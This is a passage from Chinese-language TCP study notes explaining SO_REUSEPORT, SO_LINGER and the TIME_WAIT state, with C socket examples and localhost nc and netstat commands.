<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">return from epoll_wait, pid is 25410</span><br><span class="line">return from epoll_wait, pid is 25411</span><br><span class="line">return from epoll_wait, pid is 25409</span><br><span class="line">return from epoll_wait, pid is 25412</span><br><span class="line">accept success, pid is 25410</span><br><span class="line">accept failed, pid is 25411</span><br><span class="line">accept failed, pid is 25409</span><br><span class="line">accept failed, pid is 25412</span><br></pre></td></tr></table></figure>
<p>可以看到当有新的网络事件发生时，阻塞在 <code>epoll_wait</code> 的多个进程同时被唤醒。在这种情况下，epoll 的惊群还是存在，有不少的措施可以解决 epoll 的惊群。Nginx 为了处理惊群问题，在应用层增加了 <code>accept_mutex</code>锁，这里不再展开，有兴趣的读者可以再深入学习一下这部分的知识。</p>
<p>为了解决惊群问题，比较省力省心的方式是使用 <code>SO_REUSEPORT</code> 选项，接下来开始介绍这部分的内容。</p>
<h3 id="SO-REUSEPORT-选项基本使用"><a href="#SO-REUSEPORT-选项基本使用" class="headerlink" title="SO_REUSEPORT 选项基本使用"></a>SO_REUSEPORT 选项基本使用</h3><p>以下面的 test.c 代码为例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">  struct sockaddr_in serv_addr;</span><br><span class="line">  int sock_fd &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">  setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &amp;optval, sizeof(optval));</span><br><span class="line">  bzero((char *)&amp;serv_addr, sizeof(serv_addr));</span><br><span class="line">  serv_addr.sin_family &#x3D; AF_INET;</span><br><span class="line">  serv_addr.sin_addr.s_addr &#x3D; htonl(INADDR_ANY);</span><br><span class="line">  serv_addr.sin_port &#x3D; htons(9090);</span><br><span class="line">  int ret &#x3D; bind(sock_fd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr));</span><br><span class="line">  if (ret &lt; 0) &#123;</span><br><span class="line">	printf(&quot;bind error, code is %d\n&quot;, ret);</span><br><span class="line">	exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  sleep(-1);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用 GCC 编译上面的代码，在两个终端中运行这个可执行文件，第二次运行会 bind 端口失败，提示如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind error, code is -1</span><br></pre></td></tr></table></figure>
<p>修改上面的代码，给 socket 增加 SO_REUSEPORT 选项，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#define BUF_SIZE 256</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">  int sock_fd, connect_fd;</span><br><span class="line">  char buffer[BUF_SIZE];</span><br><span class="line">  struct sockaddr_in serv_addr, cli_addr;</span><br><span class="line">  int cli_addr_len &#x3D; sizeof(cli_addr);</span><br><span class="line">  int n;</span><br><span class="line"></span><br><span class="line">  sock_fd &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">  int optval &#x3D; 1;</span><br><span class="line"></span><br><span class="line">  setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &amp;optval, sizeof(optval));</span><br><span class="line">  setsockopt(sock_fd, SOL_SOCKET, SO_REUSEPORT, &amp;optval, sizeof(optval));</span><br><span class="line">  bzero((char *)&amp;serv_addr, sizeof(serv_addr));</span><br><span class="line">  serv_addr.sin_family &#x3D; AF_INET;</span><br><span class="line">  serv_addr.sin_addr.s_addr &#x3D; INADDR_ANY;</span><br><span class="line">  serv_addr.sin_port &#x3D; htons(9090);</span><br><span class="line"></span><br><span class="line">  int ret &#x3D; bind(sock_fd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr));</span><br><span class="line">  if (ret &lt; 0) &#123;</span><br><span class="line">    printf(&quot;bind error, code is %d\n&quot;, ret);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  listen(sock_fd, 5);</span><br><span class="line"></span><br><span class="line">  while (1) &#123;</span><br><span class="line">    connect_fd &#x3D; accept(sock_fd, (struct sockaddr *)&amp;cli_addr, &amp;cli_addr_len);</span><br><span class="line">    printf(&quot;process new request\n&quot;);</span><br><span class="line">    n &#x3D; read(connect_fd, buffer, BUF_SIZE);</span><br><span class="line">    write(connect_fd, buffer, n);</span><br><span class="line">    close(connect_fd);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新编译上面的代码，在两个终端中分别运行这个可执行文件，这次不会出现 bind 失败的情况。使用 <code>ss</code> 命令来查看当前的套接字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ss -tlnpe | grep -i 9090</span><br><span class="line">State      Recv-Q Send-Q Local Address:Port Peer Address:Port</span><br><span class="line">LISTEN     0      5            *:9090 *:*                   users:((&quot;reuse_port&quot;,pid&#x3D;26897,fd&#x3D;3)) uid:1000 ino:2168508 sk:ffff880079033e00 &lt;-&gt;</span><br><span class="line">LISTEN     0      5            *:9090 *:*                   users:((&quot;reuse_port&quot;,pid&#x3D;26855,fd&#x3D;3)) uid:1000 ino:2168453 sk:ffff880079037440 &lt;-&gt;</span><br></pre></td></tr></table></figure>
<p>注意到最后一列中的信息，可以看到监听 9090 端口的是两个不同的 socket，它们的 inode 号分别是 2168508 和 2168453。</p>
<p>ss 是一个非常有用的命令，它的选项解释如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-t, --tcp</span><br><span class="line">    显示 TCP 的 socket</span><br><span class="line">-l, --listening</span><br><span class="line">    只显示 listening 状态的 socket，默认情况下是不显示的。</span><br><span class="line">-n, --numeric</span><br><span class="line">    显示端口号而不是映射的服务名</span><br><span class="line">-p, --processes</span><br><span class="line">    显示进程名</span><br><span class="line">-e, --extended</span><br><span class="line">    显示 socket 的详细信息</span><br></pre></td></tr></table></figure>
<p>写一段 shell 脚本请求 10 次 9090 端口的服务，脚本内容如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..10&#125; ; do</span><br><span class="line">   echo &quot;hello&quot; | nc -i 1 localhost 9090</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>执行脚本，终端 1 中的进程处理了四次请求，终端 2 中的进程处理了六次请求，如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/103.jpg"></p>
<p>这个处理过程如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/104.jpg"></p>
<p>当一个新请求到来，内核是如何确定应该由哪个 <code>LISTEN socket</code> 来处理？接下来我们来看 <code>SO_REUSEPORT</code> 底层实现原理，</p>
<h3 id="SO-REUSEPORT-源码分析"><a href="#SO-REUSEPORT-源码分析" class="headerlink" title="SO_REUSEPORT 源码分析"></a>SO_REUSEPORT 源码分析</h3><p>内核为处于 LISTEN 状态的 socket 分配了大小为 32 哈希桶。监听的端口号经过哈希算法运算打散到这些哈希桶中，相同哈希的端口采用拉链法解决冲突。当收到客户端的 SYN 握手报文以后，会根据目标端口号的哈希值计算出哈希冲突链表，然后遍历这条哈希链表得到最匹配的得分最高的 Socket。对于使用 SO_REUSEPORT 选项的 socket，可能会有多个 socket 得分最高，这个时候经过随机算法选择一个进行处理。</p>
<p>假设有 <code>127.0.0.1:2222</code>、<code>127.0.0.1:9998</code>、<code>10.211.55.17:9966</code>、<code>10.211.55.10:2222</code> 这几个监听套接字，这几个套接字被哈希到同一个链表中，当有 <code>127.0.0.1:2222</code> 套接字的 SYN 包到来时，会遍历这个哈希链表，查找得分最高的两个 socket，然后通过随机选择其中的一个。</p>
<p>如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/105.jpg"></p>
<h3 id="SO-REUSEPORT-与安全性"><a href="#SO-REUSEPORT-与安全性" class="headerlink" title="SO_REUSEPORT 与安全性"></a>SO_REUSEPORT 与安全性</h3><p>试想下面的场景，你的进程进程监听了某个端口，不怀好意的其他人也可以监听相同的端口来“窃取”流量信息，这种方式被称为<code>端口劫持</code>（port hijacking）。SO_REUSEPORT 在安全性方面的考虑主要是下面这两点。</p>
<p>1、只有第一个启动的进程启用了 <code>SO_REUSEPORT</code> 选项，后面启动的进程才可以绑定同一个端口。 2、后启动的进程必须与第一个进程的<code>有效用户ID</code>（effective user ID）匹配才可以绑定成功。</p>
<h3 id="SO-REUSEPORT-的应用"><a href="#SO-REUSEPORT-的应用" class="headerlink" title="SO_REUSEPORT 的应用"></a>SO_REUSEPORT 的应用</h3><p>SO_REUSEPORT 带来了两个明显的好处：</p>
<p>1.实现了内核级的负载均衡</p>
<p>2.支持滚动升级（Rolling updates）</p>
<p>内核级的负载均衡在前面的 Nginx 的例子中已经介绍过了，这里不再赘述。使用 SO_REUSEPORT 做滚动升级的过程如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/106.jpg"></p>
<p>步骤如下所示。</p>
<p>1.新启动一个新版本 <code>v2</code> ，监听同一个端口，与 <code>v1</code> 旧版本一起处理请求。</p>
<p>2.发送信号给 <code>v1</code> 版本的进程，让它不再接受新的请求</p>
<p>3.等待一段时间，等 <code>v1</code> 版本的用户请求都已经处理完毕时，<code>v1</code> 版本的进程退出，留下 <code>v2</code> 版本继续服务</p>
<h3 id="小结-9"><a href="#小结-9" class="headerlink" title="小结"></a>小结</h3><p>这个小节主要介绍了 <code>SO_REUSEPORT</code> 参数相关的知识，本来是一个很简单的参数选项，为了讲清楚来龙去脉，还是挺复杂的。</p>
<h2 id="19-优雅关闭连接-——-Socket-选项之-SO-LINGER"><a href="#19-优雅关闭连接-——-Socket-选项之-SO-LINGER" class="headerlink" title="19 优雅关闭连接 —— Socket 选项之 SO_LINGER"></a>19 优雅关闭连接 —— Socket 选项之 SO_LINGER</h2><p>这篇文章我们来讲一个新的参数 SO_LINGER，以一个小测验来开始今天的文章。 请看下面的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Socket socket &#x3D; new Socket();</span><br><span class="line">InetSocketAddress serverSocketAddress &#x3D; new InetSocketAddress(&quot;10.0.0.3&quot;, 8080);</span><br><span class="line">socket.connect(serverSocketAddress);</span><br><span class="line"></span><br><span class="line">byte[] msg &#x3D; getMessageBytes(); </span><br><span class="line">socket.getOutputStream().write(msg);</span><br><span class="line"></span><br><span class="line">socket.close();</span><br></pre></td></tr></table></figure>
<p>会发现如下哪个选项的事情</p>
<p>1.服务器收到 msg 所有内容</p>
<p>2.服务器会收到 msg 部分内容</p>
<p>3.服务器会抛出异常</p>
<p>简化为图如下：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/107.jpg"></p>
<p>当我们调用 <code>write</code> 函数向内核写入一段数据时，内核会把这段时间放入一个缓冲区 <code>buffer</code>，如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/108.jpg"></p>
<h3 id="关闭连接的两种方式"><a href="#关闭连接的两种方式" class="headerlink" title="关闭连接的两种方式"></a>关闭连接的两种方式</h3><p>前面有介绍过有两种方式可以关闭 TCP 连接</p>
<p>1.FIN：优雅关闭，发送 FIN 包表示<code>自己这端所有的数据都已经发送出去了</code>，后面不会再发送数据  </p>
<p>2.RST：<code>强制连接重置关闭</code>，无法做出什么保证</p>
<p>当调用 socket.close() 的时候会发生什么呢？</p>
<p>正常情况下</p>
<p>1.操作系统等所有的数据发送完才会关闭连接</p>
<p>2.因为是主动关闭，所以连接将处于 <code>TIME_WAIT</code> 两个 <code>2*MSL</code></p>
<h3 id="SO-LINGER"><a href="#SO-LINGER" class="headerlink" title="SO_LINGER"></a>SO_LINGER</h3><p>Linux 的套接字选项<code>SO_LINGER</code> 用来改变socket 执行 <code>close()</code> 函数时的默认行为。</p>
<p>linger 的英文释义有逗留、徘徊、继续存留、缓慢消失的意思。这个释义与这个参数真正的含义很接近。</p>
<p><code>SO_LINGER 启用时，操作系统开启一个定时器，在定时器期间内发送数据，定时时间到直接 RST 连接</code>。</p>
<p>SO_LINGER 参数是一个 linger 结构体，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct linger &#123;</span><br><span class="line">    int l_onoff;    &#x2F;* linger active *&#x2F;</span><br><span class="line">    int l_linger;   &#x2F;* how many seconds to linger for *&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>第一个字段 l_onoff 用来表示是否启用 linger 特性，非 0 为启用，0 为禁用 ，linux 内核默认为禁用。这种情况下 close 函数立即返回，操作系统负责把缓冲队列中的数据全部发送至对端</p>
<p>第二个参数 l_linger 在 l_onoff 为非 0 （即启用特性）时才会生效。</p>
<pre><code>如果 l_linger 的值为 0，那么调用 close，close 函数会立即返回，同时丢弃缓冲区内所有数据并立即发送 RST 包重置连接
如果 l_linger 的值为非 0，那么此时 close 函数在阻塞直到 l_linger 时间超时或者数据发送完毕，发送队列在超时时间段内继续尝试发送，如果发送完成则皆大欢喜，超时则直接丢弃缓冲区内容 并 RST 掉连接。</code></pre>
<h3 id="实验时间"><a href="#实验时间" class="headerlink" title="实验时间"></a>实验时间</h3><h3 id="小结-10"><a href="#小结-10" class="headerlink" title="小结"></a>小结</h3><p>这篇文章主要介绍了 <code>SO_LINGER</code> 套接字选项对关闭套接字的影响。默认行为下是调用 close 立即返回，但是如果有数据残留在套接字发送缓冲区中，系统将试着把这些数据发送给对端，<code>SO_LINGER</code> 可以改变这个默认设置，具体的规则见下面的思维导图。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/109.jpg"></p>
<h2 id="20-一个神奇的状态-——-TIME-WAIT"><a href="#20-一个神奇的状态-——-TIME-WAIT" class="headerlink" title="20 一个神奇的状态 —— TIME_WAIT"></a>20 一个神奇的状态 —— TIME_WAIT</h2><p><code>TIME_WAIT</code> 是 TCP 所有状态中最不好理解的一种状态。首先，我们需要明确，只有主动断开的那一方才会进入 <code>TIME_WAIT</code> 状态，且会在那个状态持续 2 个 <code>MSL</code>（<code>Max Segment Lifetime</code>）。</p>
<p>为了讲清楚 <code>TIME_WAIT</code>，需要先介绍一下 MSL 的概念。</p>
<h3 id="MSL：Max-Segment-Lifetime"><a href="#MSL：Max-Segment-Lifetime" class="headerlink" title="MSL：Max Segment Lifetime"></a>MSL：Max Segment Lifetime</h3><p><code>MSL</code>（报文最大生存时间）是 TCP 报文在网络中的最大生存时间。这个值与 IP 报文头的 <code>TTL</code> 字段有密切的关系。</p>
<p>IP 报文头中有一个 8 位的存活时间字段（<code>Time to live</code>, TTL）如下图。 这个存活时间存储的不是具体的时间，而是一个 IP 报文最大可经过的路由数，每经过一个路由器，TTL 减 1，当 TTL 减到 0 时这个 IP 报文会被丢弃。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/110.jpg"></p>
<p>TTL 经过<code>路由器</code>不断减小的过程如下图所示，假设初始的 <code>TTL</code> 为 12，经过下一个路由器 R1 以后 TTL 变为 11，后面每经过一个<code>路由器</code>以后 TTL 减 1</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/111.jpg"></p>
<p>从上面可以看到 TTL 说的是<code>「跳数」</code>限制而不是<code>「时间」</code>限制，尽管如此我们依然假设最大跳数的报文在网络中存活的时间不可能超过 <code>MSL</code> 秒。Linux 的套接字实现假设 MSL 为 <code>30 </code>秒，因此在 Linux 机器上 TIME_WAIT 状态将持续 <code>60</code>秒。</p>
<h3 id="构造一个-TIME-WAIT"><a href="#构造一个-TIME-WAIT" class="headerlink" title="构造一个 TIME_WAIT"></a>构造一个 TIME_WAIT</h3><p>要构造一个 TIME_WAIT 非常简单，只需要建立一个 TCP 连接，然后断开某一方连接，主动断开的那一方就会进入 <code>TIME_WAIT</code> 状态，我们用 Linux 上开箱即用的 <code>nc</code> 命令来构造一个。过程如下图：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/112.jpg"></p>
<p>1.在机器 c2 上用<code>nc -l 8888</code>启动一个 TCP 服务器</p>
<p>2.在机器 c1 上用 <code>nc c2 8888</code> 创建一条 TCP 连接</p>
<p>3.在机器 c1 上用 <code>Ctrl+C</code> 停止 nc 命令，随后在用<code>netstat -atnp | grep 8888</code>查看连接状态。</p>
<h3 id="TIME-WAIT-存在的原因是什么"><a href="#TIME-WAIT-存在的原因是什么" class="headerlink" title="TIME_WAIT 存在的原因是什么"></a>TIME_WAIT 存在的原因是什么</h3><p>第一个原因是：数据报文可能在发送途中延迟但最终会到达，因此要等老的“迷路”的重复报文段在网络中过期失效，这样可以避免用<code>相同</code>源端口和目标端口创建新连接时收到旧连接姗姗来迟的数据包，造成数据错乱。</p>
<p>比如下面的例子</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/113.jpg"></p>
<p>假设客户端 10.211.55.2 的 61594 端口与服务端 10.211.55.10 的 8080 端口一开始建立了一个 TCP 连接。</p>
<p>假如客户端发送完 FIN 包以后不等待直接进入 CLOSED 状态，老连接 SEQ=3 的包因为网络的延迟。过了一段时间<code>相同</code>的 IP 和端口号又新建了另一条连接，这样 TCP 连接的四元组就完全一样了。恰好 SEQ 因为<code>回绕</code>等原因也正好相同，那么 SEQ=3 的包就无法知道到底是旧连接的包还是新连接的包了，造成新连接数据的混乱。</p>
<p><code>TIME_WAIT</code> 等待时间是 2 个 MSL，已经足够让一个方向上的包最多存活 MSL 秒就被丢弃，保证了在创建新的 TCP 连接以后，老连接姗姗来迟的包已经在网络中被丢弃消逝，不会干扰新的连接。</p>
<p>第二个原因是确保可靠实现 TCP 全双工终止连接。关闭连接的四次挥手中，最终的 ACK 由主动关闭方发出，如果这个 ACK 丢失，对端（被动关闭方）将重发 FIN，如果主动关闭方不维持 TIME_WAIT 直接进入 CLOSED 状态，则无法重传 ACK，被动关闭方因此不能及时可靠释放。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/114.jpg"></p>
<p>如果四次挥手的第 4 步中客户端发送了给服务端的确认 ACK 报文以后不进入 TIME_WAIT 状态，直接进入 CLOSED状态，然后重用端口建立新连接会发生什么呢？如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/115.jpg"></p>
<p>主动关闭方如果马上进入 <code>CLOSED</code> 状态，被动关闭方这个时候还处于<code>LAST-ACK</code>状态，主动关闭方认为连接已经释放，端口可以重用了，如果使用相同的端口三次握手发送 SYN 包，会被处于 <code>LAST-ACK</code>状态状态的被动关闭方返回一个 <code>RST</code>，三次握手失败。</p>
<h3 id="为什么时间是两个-MSL"><a href="#为什么时间是两个-MSL" class="headerlink" title="为什么时间是两个 MSL"></a>为什么时间是两个 MSL</h3><p>①1 个 MSL 确保四次挥手中主动关闭方最后的 ACK 报文最终能达到对端</p>
<p>②1 个 MSL 确保对端没有收到 ACK 重传的 FIN 报文可以到达</p>
<h3 id="TIME-WAIT-的问题"><a href="#TIME-WAIT-的问题" class="headerlink" title="TIME_WAIT 的问题"></a>TIME_WAIT 的问题</h3><p>在一个非常繁忙的服务器上，如果有大量 <code>TIME_WAIT</code> 状态的连接会怎么样呢？</p>
<p>1.连接表无法复用</p>
<p>2.socket 结构体内存占用</p>
<p><code>连接表无法复用</code> 因为处于 TIME_WAIT 的连接会存活 2MSL（60s），意味着相同的TCP 连接四元组（源端口、源 ip、目标端口、目标 ip）在一分钟之内都没有办法复用，通俗一点来讲就是“占着茅坑不拉屎”。</p>
<p>假设主动断开的一方是客户端，对于 web 服务器而言，目标地址、目标端口都是固定值（比如本机 ip + 80 端口），客户端的 IP 也是固定的，那么能变化的就只有端口了，在一台 Linux 机器上，端口最多是 65535 个（ 2 个字节）。如果客户端与服务器通信全部使用短连接，不停的创建连接，接着关闭连接，客户端机器会造成大量的 TCP 连接进入 TIME_WAIT 状态。</p>
<p>可以来写一个简单的 shell 脚本来测试一下，使用 nc 命令连接 redis 发送 ping 命令以后断开连接。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..10000&#125;; do</span><br><span class="line">    echo ping | nc localhost 6379</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>查看一下处于 <code>TIME_WAIT</code> 状态的连接的个数，短短的几秒钟内，<code>TIME_WAIT</code> 状态的连接已经有了 8000 多个。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -tnpa | grep -i 6379 | grep  TIME_WAIT| wc -l</span><br><span class="line">8192</span><br></pre></td></tr></table></figure>
<p>如果在 60s 内有超过 65535 次 redis 短连接操作，就会出现端口不够用的情况，这也是使用<code>连接池</code>的一个重要原因。</p>
<h3 id="应对-TIME-WAIT-的各种操作"><a href="#应对-TIME-WAIT-的各种操作" class="headerlink" title="应对 TIME_WAIT 的各种操作"></a>应对 TIME_WAIT 的各种操作</h3><p>除了我们之前介绍的 MSS、Window Scale 还有以一个非常重要的选项：<code>时间戳</code>（TCP Timestamps Option，TSopt）</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/116.jpg"></p>
<p>它由四部分构成：类别（kind）、长度（Length）、发送方时间戳（TS value）、回显时间戳（TS Echo Reply）。时间戳选项类别（kind）的值等于 8，用来与其它类型的选项区分。长度（length）等于 10。两个时间戳相关的选项都是 4 字节。</p>
<p>如下图所示：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/117.jpg"></p>
<p>是否使用时间戳选项是在三次握手里面的 SYN 报文里面确定的。在之前也有介绍过,这里就不提了。</p>
<h3 id="tcp-tw-reuse-选项"><a href="#tcp-tw-reuse-选项" class="headerlink" title="tcp_tw_reuse 选项"></a>tcp_tw_reuse 选项</h3><p>缓解紧张的端口资源，一个可行的方法是重用“浪费”的处于 TIME_WAIT 状态的连接，当开启 <code>net.ipv4.tcp_tw_reuse</code> 选项时，处于 TIME_WAIT 状态的连接可以被重用。下面把主动关闭方记为 A， 被动关闭方记为 B，它的原理是：</p>
<p>1.如果主动关闭方 A 收到的包时间戳比当前存储的时间戳小，说明是一个迷路的旧连接的包，直接丢弃掉</p>
<p>2.如果因为 ACK 包丢失导致被动关闭方还处于LAST-ACK状态，并且会持续重传 FIN+ACK。这时 A 发送SYN 包想三次握手建立连接，此时 A 处于SYN-SENT阶段。当收到 B 的 FIN 包时会回以一个 <code>RST</code> 包给 B，B 这端的连接会进入 <code>CLOSED</code> 状态，A 因为没有收到 SYN 包的 ACK，会重传 SYN，后面就一切顺利了。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/118.jpg"></p>
